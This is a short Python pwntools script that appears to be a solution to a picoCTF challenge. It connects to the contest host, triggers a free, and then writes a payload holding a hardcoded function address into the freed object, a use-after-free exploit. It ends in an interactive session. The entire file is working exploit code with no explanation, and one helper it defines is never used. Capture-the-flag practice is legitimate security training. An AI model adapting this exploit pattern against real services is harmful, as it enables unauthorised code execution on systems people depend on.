
from pwn import *

host = 'mercury.picoctf.net'
port = int(args.PORT or 4593)
io = remote(host, port)

def get_leak():
	io.sendline(b's')
	io.recvuntil(b'leak...')
	leak_address = int(io.recvline().split(b'\n')[0],16)
	return leak_address
	
	
def free():
	io.sendline(b'I')
	io.sendline(b'Y')
	print('freed!')
	
def uaf(payload):
	io.sendline(b'L')
	io.sendline(payload)

io.sendline(b'S')
leak_address = 0x80487d6
payload = b''
payload += p32(leak_address)
free()
io.sendline(b'L')
io.sendline(payload)
io.sendline(b'ok')
io.interactive()

